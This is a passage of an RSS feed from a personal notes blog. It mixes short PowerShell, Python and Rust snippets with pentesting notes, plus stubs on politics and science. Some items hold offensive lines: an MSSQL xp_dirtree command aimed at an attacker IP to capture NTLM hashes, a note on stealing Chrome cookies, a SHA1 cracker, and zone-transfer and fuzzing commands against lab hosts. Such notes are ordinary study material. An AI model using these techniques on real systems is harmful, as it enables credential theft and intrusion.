      <description>Vulnerability in str.format() in Python https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/</description>
    </item>
    
    <item>
      <title>Pentest - SMB p 139,445</title>
      <link>https://kdbed.github.io/posts/pentest_smb_p_139_445/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/pentest_smb_p_139_445/</guid>
      <description>HackTricks
Port 139 NetBIOS NetBIOS is Network Basic Input Output System, which is a software protocol that allows applications, PCs, and Desktops on a local area network (LAN) to communicate with network hardware and to transmit data across the network.
Port 445 SMB - Server Message Block While Port 139 is known technically as ‘NBT over IP’, Port 445 is ‘SMB over IP’. SMB stands for ‘Server Message Blocks’.
SMB Server Message Block (SMB) is a client-server protocol that regulates access to files and entire directories and other network resources such as printers, routers, or interfaces released for the network.</description>
    </item>
    
    <item>
      <title>Pentest - SQL</title>
      <link>https://kdbed.github.io/posts/pentest_sql/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/pentest_sql/</guid>
      <description>MySQL mysql -u fooUser -p -h 44.55.66.77
MSSQL impacket-mssqlclient -port 1433 domain/user:password@host
capture NTLM hashes: SQL&amp;gt; exec master.sys.xp_dirtree &amp;quot;\\10.10.16.2\test&amp;quot;</description>
    </item>
    
    <item>
      <title>Pentest - SSH p 22</title>
      <link>https://kdbed.github.io/posts/pentest_ssh/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/pentest_ssh/</guid>
      <description>Pentesting SSH ssh-audit Install
sudo apt install ssh-audit </description>
    </item>
    
    <item>
      <title>Pentest - Stealing Chrome Cookies</title>
      <link>https://kdbed.github.io/posts/pentest_stealing_chrome_cookies/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/pentest_stealing_chrome_cookies/</guid>
      <description>Stealing Chrome Cookies source: mango.pdf.zone
Using Chrome&amp;rsquo;s remote debugging protocol to steal cookies. github - defaultnamehere
requires rce on victim&amp;rsquo;s machine </description>
    </item>
    
    <item>
      <title>philosophy</title>
      <link>https://kdbed.github.io/posts/philosophy/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/philosophy/</guid>
      <description></description>
    </item>
    
    <item>
      <title>Physics</title>
      <link>https://kdbed.github.io/posts/physics/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/physics/</guid>
      <description></description>
    </item>
    
    <item>
      <title>PIE</title>
      <link>https://kdbed.github.io/posts/pie/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/pie/</guid>
      <description>Binary Analysis</description>
    </item>
    
    <item>
      <title>Political Science</title>
      <link>https://kdbed.github.io/posts/political_science/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/political_science/</guid>
      <description>philosophy</description>
    </item>
    
    <item>
      <title>politics</title>
      <link>https://kdbed.github.io/posts/politics/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/politics/</guid>
      <description></description>
    </item>
    
    <item>
      <title>powershell</title>
      <link>https://kdbed.github.io/posts/powershell/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/powershell/</guid>
      <description></description>
    </item>
    
    <item>
      <title>PowerShell - Classes</title>
      <link>https://kdbed.github.io/posts/powershell_classes/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/powershell_classes/</guid>
      <description>powershell - Classes Introduction PowerShell is an object-oriented language. When you run commands, see the output on your screen, those are objects.
Skeleton of a class called student:
class student { } Classes have properties that look like parameters that are attributes that describe that class. The example below shows a class called student with two properties; FirstName and LastName.
When you define a property, you should always define a type that sets a specific schema for what property values can hold.</description>
    </item>
    
    <item>
      <title>PowerShell - Clipboard to Array</title>
      <link>https://kdbed.github.io/posts/powershell_clipboard_to_array/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/powershell_clipboard_to_array/</guid>
      <description>(Get-Clipboard) -split &amp;#39;\t|\r?\n&amp;#39; </description>
    </item>
    
    <item>
      <title>PowerShell - Common Members of two groups</title>
      <link>https://kdbed.github.io/posts/powershell_common_members_of_two_groups/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/powershell_common_members_of_two_groups/</guid>
      <description>Get members in common for 2 groups in AD Function Get-ADGroupMembersInBothGroups { Param ( [Parameter(Mandatory=$true)] [string]$Group1, [Parameter(Mandatory=$true)] [string]$Group2 ) $Group1Members = Get-ADGroup -Identity $Group1 -properties members |select -expand members $Group2Members = Get-ADGroup -Identity $Group2 -properties members|select -expand members $match = $Group1Members | Where-Object {$Group2Members -contains $_} write-host $match } </description>
    </item>
    
    <item>
      <title>PowerShell - Custom Execution Timer</title>
      <link>https://kdbed.github.io/posts/powershell_custom_execution_timer/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/powershell_custom_execution_timer/</guid>
      <description>Custom Execution Timer source: devblogs
function Measure-CommandEx { [CmdletBinding()] param ( [Parameter(Mandatory, Position = 0)] [scriptblock]$Expression, [Parameter(ValueFromPipeline)] [psobject[]]$InputObject ) Begin { $stopWatch = New-Object -TypeName &amp;#39;System.Diagnostics.Stopwatch&amp;#39; &amp;lt;# We need to define result as a list because the way objects are passed to the pipeline. If you pass a collection of objects, the pipeline sends them one by one, and the result is always overridden by the last item. #&amp;gt; [System.Collections.Generic.List[PSObject]]$result = @() } Process { if ($InputObject) { # Starting the stopwatch.</description>
    </item>
    
    <item>
      <title>PowerShell - Get Domain Controllers in Forest</title>
      <link>https://kdbed.github.io/posts/powershell_get_domain_controllers_in_forest/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/powershell_get_domain_controllers_in_forest/</guid>
      <description>To list all of the domain controllers in an Active Directory forest:
(Get-ADForest).Domains | %{ Get-ADDomainController -Filter * -Server $_ }| Format-Table -Property Name,ComputerObjectDN,Domain,Forest,IPv4Address,OperatingSystem,OperatingSystemVersion </description>
    </item>
    
    <item>
      <title>PowerShell - Log Function</title>
      <link>https://kdbed.github.io/posts/powershell_log_function/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/powershell_log_function/</guid>
      <description>Log Function for powershell function Write-Log { [CmdletBinding()] param( [Parameter()] [ValidateNotNullOrEmpty()] [string]$Message, [Parameter()] [ValidateNotNullOrEmpty()] [ValidateSet(&amp;#39;Information&amp;#39;,&amp;#39;Warning&amp;#39;,&amp;#39;Error&amp;#39;)] [string]$Severity = &amp;#39;Information&amp;#39; ) [pscustomobject]@{ Time = (Get-Date -f g) Message = $Message Severity = $Severity } | Export-Csv -Path &amp;#34;$env:Temp\LogFile.csv&amp;#34; -Append -NoTypeInformation } From : ATA</description>
    </item>
    
    <item>
      <title>PowerShell - Regex - string between two strings</title>
      <link>https://kdbed.github.io/posts/powershell_regex_string_between_two_strings/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/powershell_regex_string_between_two_strings/</guid>
      <description>Regex - string between two strings 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 function GetStringBetweenTwoStrings($firstString, $secondString, $importPath){ #Get content from file $file = gc -raw $importPath #Regex pattern to compare two strings $pattern = &amp;#39;$firstString(.*?)$secondString&amp;#39; #Perform the opperation $result = [regex]::Match($file,$pattern).Groups.Value #Return result write-host $result } </description>
    </item>
    
    <item>
      <title>PowerShell - Rust</title>
      <link>https://kdbed.github.io/posts/powershell_rust/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/powershell_rust/</guid>
      <description>Basic Rust Integration with powershell $rustPgm = @&amp;#34; #[no_mangle] pub extern &amp;#34;C&amp;#34; fn add_numbers(number1: i32, number2: i32) -&amp;gt; i32 { number1 + number2 } &amp;#34;@ $rustPgm | Set-Content -Encoding UTF8 .\lib.rs rustc .\lib.rs --crate-type dylib --crate-name powershell_to_rust ## start another PS so dll doesn&amp;#39;t get locked powershell -command { $definition = @&amp;#34; [DllImport(&amp;#34;powershell_to_rust.dll&amp;#34;)] public static extern Int32 add_numbers(Int32 number1, Int32 number2); &amp;#34;@ $target = Add-Type -MemberDefinition $definition -Name AddNum -PassThru $ans = $target::add_numbers(3, 8) write-host $ans } </description>
    </item>
    
    <item>
      <title>PowerShell - Script Encryption</title>
      <link>https://kdbed.github.io/posts/powershell_script_encryption/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/powershell_script_encryption/</guid>
      <description>Encrypt powershell Scripts Function to obfuscate code containing sensitive data:
function Encrypt-Script($path, $destination) { $script = Get-Content $path | Out-String $secure = ConvertTo-SecureString $script -asPlainText -force $export = $secure | ConvertFrom-SecureString Set-Content $destination $export &amp;#34;Script &amp;#39;$path&amp;#39; has been encrypted as &amp;#39;$destination&amp;#39;&amp;#34; } function Execute-EncryptedScript($path) { trap { &amp;#34;Decryption failed&amp;#34;; break } $raw = Get-Content $path $secure = ConvertTo-SecureString $raw $helper = New-Object system.Management.Automation.PSCredential(&amp;#34;test&amp;#34;, $secure) $plain = $helper.GetNetworkCredential().Password Invoke-Expression $plain } From: idera</description>
    </item>
    
    <item>
      <title>PowerShell - Search-ADAccount</title>
      <link>https://kdbed.github.io/posts/powershell_search_adaccount/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/powershell_search_adaccount/</guid>
      <description>Search-ADAccount shellgeek</description>
    </item>
    
    <item>
      <title>PowerShell - Splatting</title>
      <link>https://kdbed.github.io/posts/powershell_splatting/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/powershell_splatting/</guid>
      <description>Splatting in powershell Splatting allows one to format and send arguments to cmdlets and functions. Typically use dash+parameter name+argument
Copy-Item -Path &amp;#34;Testfile.txt&amp;#34; -Destination &amp;#34;CopiedFile.txt&amp;#34; -WhatIf -force -Recurse Copy-Item ` -Path &amp;#34;Testfile.txt&amp;#34; ` -Destination &amp;#34;CopiedFile.txt&amp;#34; ` -WhatIf ` -force ` Instead you can splat a parameter set. First create a hashtable containing key/value pairs of each parameter and parameter argument. Then pass that set of parameters to the command with @&amp;lt;hashtablename&amp;gt;</description>
    </item>
    
    <item>
      <title>PowerShell - Writing cmdlets in C#</title>
      <link>https://kdbed.github.io/posts/powershell_writing_cmdlets_in_c/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/powershell_writing_cmdlets_in_c/</guid>
      <description>Writing powershell cmdlets in C# source: dotnetninja
Overview create a new class that derives from one of two base classes (Cmdlet or PsCmdlet), add properties to the class to accept your parameters, override one or more methods in the base class to provide your functionality, and decorate the class and properties with a few attributes.
cmdlet name all defined in constants in the C# reference library
VerbsCommon: Add, Clear, Close, Copy, Enter, Exit, Find, Format, Get, Hide, Join, Lock, Move, New, Open, Optimize, Pop, Push, Redo, Remove, Rename, Reset, Resize, Search, Select, Set, Show, Skip, Split, Step, Switch, Undo, Unlock, Watch</description>
    </item>
    
    <item>
      <title>Python - List Comprehensions</title>
      <link>https://kdbed.github.io/posts/python_list_comprehensions/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/python_list_comprehensions/</guid>
      <description>Python - List Comprehensions List comprehensions are a compact way of defining a list by looping through another list or other data structure. Let&amp;rsquo;s say we want to double every element in a list. Without list comprehensions:
sample_list = [4, 5, 6, 7] new_list = [] for i in range(len(sample_list)): new_list.append(sample_list[i]*2) print(new_list) [8, 10, 12, 14] A simplified way to do this:
newer_list = [2*num for num in sample_list] print(newer_list) [8, 10, 12, 14] List Comprehensions on lists of strings sample_strings = [&amp;#34;python&amp;#34;, &amp;#34;is&amp;#34;, &amp;#34;awesome!</description>
    </item>
    
    <item>
      <title>Quantum Mechanics</title>
      <link>https://kdbed.github.io/posts/quantum_mechanics/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/quantum_mechanics/</guid>
      <description></description>
    </item>
    
    <item>
      <title>Quotes</title>
      <link>https://kdbed.github.io/posts/quotes/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/quotes/</guid>
      <description>Quotes Quote 1 - Marx You would be wrong if you thought that I love books. I am a machine condemned to devour them in order to vomit them up in a new form, like manure on the soil of history.
— Marx in a letter to his daughter Laura, 1868
Quote 2 &amp;ldquo;Meet these two here,&amp;rdquo; the man said. &amp;ldquo;Ask them if they&amp;rsquo;ve got a Mississippi credit card.&amp;rdquo;
&amp;ldquo;Oh, I know that one,&amp;rdquo; Ruthie explaimed cheerfully.</description>
    </item>
    
    <item>
      <title>Recon - AutoRecon</title>
      <link>https://kdbed.github.io/posts/recon_autorecon/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/recon_autorecon/</guid>
      <description>AutoRecon https://github.com/Tib3rius/AutoRecon</description>
    </item>
    
    <item>
      <title>Recon - Port Scanning and nmap</title>
      <link>https://kdbed.github.io/posts/recon_port_scanning_and_nmap/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/recon_port_scanning_and_nmap/</guid>
      <description>Basic nmap scan nmap -sC -sV -oA nmap/result &amp;lt;ip&amp;gt; Flags:
-oA &amp;lt;basename&amp;gt;: Output in the three major formats at once -sV: Probe open ports to determine service/version info -sC: default scripts UDP Scan sudo nmap -sU -sS -sC -sV -oA &amp;lt;NAME&amp;gt;.udp &amp;lt;IP&amp;gt; -v Script categories List available nse scripts nmap through socks4 proxy ftp bounce scan format ports=$(nmap -p- -Pn --min-rate=1000 -T4 10.10.11.205 | grep &amp;#39;^[0-9]&amp;#39; | cut -d &amp;#39;/&amp;#39; -f 1 | tr &amp;#39;\n&amp;#39; &amp;#39;,&amp;#39; | sed s/,$//) nmap -p$ports -Pn -sC -sV 10.</description>
    </item>
    
    <item>
      <title>RELRO</title>
      <link>https://kdbed.github.io/posts/relro/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/relro/</guid>
      <description>https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro</description>
    </item>
    
    <item>
      <title>Reverse Shell - Upgrade TTY</title>
      <link>https://kdbed.github.io/posts/reverse_shell_upgrade_tty/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/reverse_shell_upgrade_tty/</guid>
      <description>Reverse Shells then
when python isn&amp;rsquo;t available.
rev shell without python</description>
    </item>
    
    <item>
      <title>Reversing - Python</title>
      <link>https://kdbed.github.io/posts/reversing_python/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/reversing_python/</guid>
      <description>Unpacking Python Executables fortinet
extraction pyinstxtractor - extract the contents of a PyInstaller generated executable file
decompile pycdc</description>
    </item>
    
    <item>
      <title>S_MIME</title>
      <link>https://kdbed.github.io/posts/s_mime/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/s_mime/</guid>
      <description>S/MIME ComptTIA Security+ </description>
    </item>
    
    <item>
      <title>School Spending and Educational Outcomes</title>
      <link>https://kdbed.github.io/posts/school_spending_and_educational_outcomes/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/school_spending_and_educational_outcomes/</guid>
      <description>Education spending and student learning outcomes DAVID EVANS|JANUARY 17, 2019 World Bank Blog Prior findings World Bank&amp;rsquo;s World Development Report 2004 showed little correlation between spending and access to school World Development Report 2018 shows a similarly weak correlation between spending and learning outcomes Vegas and Coffin, using a different econometric specification, do find a correlation between spending and learning outcomes up to US$8,000 per student annually. Does money matter? Yes.</description>
    </item>
    
    <item>
      <title>sha1</title>
      <link>https://kdbed.github.io/posts/sha1/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/sha1/</guid>
      <description></description>
    </item>
    
    <item>
      <title>sha1Cracker</title>
      <link>https://kdbed.github.io/posts/sha1cracker/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/sha1cracker/</guid>
      <description>Implementing a sha1 hash cracker in Rust use sha1::Digest; use std::{ env, error::Error, fs::File, io::{BufRead, BufReader}, }; const SHA1_HEX_STRING_LENGTH: usize = 40; fn main() -&amp;gt; Result&amp;lt;(), Box&amp;lt;dyn Error&amp;gt;&amp;gt; { let args: Vec&amp;lt;String&amp;gt; = env::args().collect(); if args.len() != 3 { println!(&amp;#34;Usage:&amp;#34;); println!(&amp;#34;sha1_cracker: &amp;lt;wordlist.txt&amp;gt; &amp;lt;sha1_hash&amp;gt;&amp;#34;); return Ok(()); } let hash_to_crack = args[2].trim(); if hash_to_crack.len() != SHA1_HEX_STRING_LENGTH { return Err(&amp;#34;sha1 hash is not valid.&amp;#34;.into()); } let wordlist_file = File::open(&amp;amp;args[1])?; let reader = BufReader::new(&amp;amp;wordlist_file); for line in reader.</description>
    </item>
    
    <item>
      <title>SMB - Server Message Block</title>
      <link>https://kdbed.github.io/posts/smb_server_message_block/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/smb_server_message_block/</guid>
      <description></description>
    </item>
    
    <item>
      <title>SMTPS</title>
      <link>https://kdbed.github.io/posts/smtps/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/smtps/</guid>
      <description></description>
    </item>
    
    <item>
      <title>Splunk</title>
      <link>https://kdbed.github.io/posts/splunk/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/splunk/</guid>
      <description></description>
    </item>
    
    <item>
      <title>SQL Injection</title>
      <link>https://kdbed.github.io/posts/sql_injection/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/sql_injection/</guid>
      <description>SQL Injection SQLi - websocket rayhan0x01 blind sql injection via websocket
From the above post
&amp;ldquo;If you didn&amp;rsquo;t know, the main difference between HTTP and WebSocket is that HTTP is built on a request-response model whereas WebSocket is like a Socket connection where both client and server can send data anytime asynchronously. So you can&amp;rsquo;t repeat the requests made in WebSocket as you would normally do for HTTP Requests in BurpSuite.</description>
    </item>
    
    <item>
      <title>Stack Canaries</title>
      <link>https://kdbed.github.io/posts/stack_canaries/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/stack_canaries/</guid>
      <description>https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage/</description>
    </item>
    
    <item>
      <title>Subdomain Enumeration</title>
      <link>https://kdbed.github.io/posts/subdomainenumeration/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/subdomainenumeration/</guid>
      <description>From DNS dig +nocmd trick.htb axfr +noall +answer @trick.htb WFuzz In case the subdomain has a certain naming convention (Trick/HTB):
sed &amp;#39;s/^/preprod-/&amp;#39; subdomains-top1million-110000.txt Then use wfuzz:
sudo wfuzz -c -f out -w wordlist -u &amp;#34;http://trick.htb&amp;#34; -H &amp;#34;Host: FUZZ.trick.htb&amp;#34; --hw 475 </description>
    </item>
    
    <item>
      <title>Trump - Policies and Actions</title>
      <link>https://kdbed.github.io/posts/trump_policies_and_actions/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/trump_policies_and_actions/</guid>
      <description>An analysis of the coherence &amp;ndash; or lack thereof &amp;ndash; of Trump&amp;rsquo;s policies and politics , along with general remarks on what he did while in office.
Changes in American Policy Many Americans will remember President Donald Trump&amp;rsquo;s presidency as a four-yearlong storm of tweets, rallies and on-air rants that ended in a mob riot and historic second impeachment. But there was more to the Trump presidency than attention-hogging political drama and conflict; often unnoticed, Trump and his administration actually did succeed in changing some of the ways Washington works.</description>
    </item>
    
    <item>
      <title>von Neumann Architecture</title>
      <link>https://kdbed.github.io/posts/von_neumann_architecture/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/von_neumann_architecture/</guid>
      <description>von Neumann Architecture </description>
    </item>
    
    <item>
      <title>Web Pentest - Browser Extensions</title>
      <link>https://kdbed.github.io/posts/web_pentest_browser_extensions/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/web_pentest_browser_extensions/</guid>
      <description>wappalyzer Wappalyzer is a browser extension that uncovers the technologies used on websites. It detects content management systems, eCommerce platforms, web servers, JavaScript frameworks, analytics tools and many more.</description>
    </item>
    
    <item>
      <title>Web Pentest - Tools</title>
      <link>https://kdbed.github.io/posts/web_pentest_tools/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/web_pentest_tools/</guid>
      <description>Web Pentest Tools web brutator https://github.com/koutto/web-brutator https://blog.zufan.me/Web-Brutator/
yupysubdo https://github.com/0xYP/yupysubdo subdomain finder</description>
    </item>
    
    <item>
      <title>Web Pentest - Wordpress</title>
      <link>https://kdbed.github.io/posts/web_pentest_wordpress/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/web_pentest_wordpress/</guid>
      <description>Wordpress WPScan Enumerate vulnerable plugins, users, db exports:
wpscan --url &amp;lt;url&amp;gt; -e dbe,u,vp </description>
    </item>
    
    <item>
      <title>wfuzz</title>
      <link>https://kdbed.github.io/posts/wfuzz/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/wfuzz/</guid>
      <description></description>
    </item>
    
    <item>
      <title>Wildcard Certificate</title>
      <link>https://kdbed.github.io/posts/wildcard_certificate/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/wildcard_certificate/</guid>
      <description>Wildcare Certificates digicert
What is a SSL Wildcard Certificate?
A SSL/TLS Wildcard certificate is a single certificate with a wildcard character (*) in the domain name field. This allows the certificate to secure multiple sub domain names (hosts) pertaining to the same base domain.
For example, a wildcard certificate for *.(domainname).com, could be used for www.(domainname).com, mail.(domainname).com, store.(domainname).com, in addition to any additional sub domain name in the (domainname).com.
When a client checks the sub domain name in this type of certificate, it uses a shell expansion procedure to see if it matches.</description>
    </item>
    
    <item>
      <title>Windows - Cached Credentials as SYSTEM</title>
      <link>https://kdbed.github.io/posts/windows_cached_credentials_as_system/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/windows_cached_credentials_as_system/</guid>
      <description>Credentials cached as SYSTEM Cached Passwords - SYSTEM
There are passwords that can be stored in the SYSTEM context that can&amp;rsquo;t be seen in the normal Credential Manager view.
Download PsExec.exe from Technet and copy it to C:\Windows\System32.
From a command prompt run: .
From the new DOS window run:
Remove any items that appear in the list of Stored User Names and Passwords. Restart the computer.</description>
    </item>
    
    <item>
      <title>X11 Authorization</title>
      <link>https://kdbed.github.io/posts/x11_authorization/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/x11_authorization/</guid>
      <description>X11 Authorization https://stackoverflow.com/questions/37157097/how-does-x11-authorization-work-mit-magic-cookie/37367518#37367518
Well, first of all there is a file ~/.Xauthority on the machine. Notice that (usually on machine with GUI) wrong permissions of this file, can cause a login screen loop&amp;hellip; (took me hours to understand that).
As you mentioned there are 5 mechanisms:
Host access: the server has host access list (if a network address exists in this list, the connection is permitted). the list is managed using xhost command.</description>
    </item>
    
    <item>
      <title>XOR</title>
      <link>https://kdbed.github.io/posts/xor/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/xor/</guid>
      <description>XOR Basics Exclusive or &amp;ndash; &amp;lsquo;XOR&amp;rsquo; &amp;ndash; is a Boolean binary operator that is true when either the first input or the second input, but not both, are true.
XOR is a &amp;lsquo;programmable inverter&amp;rsquo;: one input bit decides whether to invert the other input bit or to just pass it through unchanged. &amp;lsquo;Inverting&amp;rsquo; bits is also called &amp;lsquo;flipping&amp;rsquo; bits.
\(X = A \bigoplus B\)
Properties </description>
    </item>
    
    <item>
      <title>Z3 Basics</title>
      <link>https://kdbed.github.io/posts/z3_basics/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/z3_basics/</guid>
      <description></description>
    </item>
    
  </channel>
</rss>
